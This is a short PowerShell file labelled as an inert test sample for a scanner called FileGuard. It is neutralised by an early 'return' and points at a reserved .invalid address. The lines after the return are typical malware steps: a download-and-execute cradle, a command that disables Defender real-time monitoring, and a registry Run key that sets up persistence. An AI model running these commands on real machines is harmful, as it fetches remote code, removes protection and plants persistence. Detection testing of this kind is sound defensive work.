# FileGuard inert test sample - non-functional, reserved addresses only
return
IEX (New-Object Net.WebClient).DownloadString('https://api.lattice-sync.invalid/a.ps1')
Set-MpPreference -DisableRealtimeMonitoring $true
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'glade' -Value 'wscript.exe C:\Users\Public\zephyr.vbs'
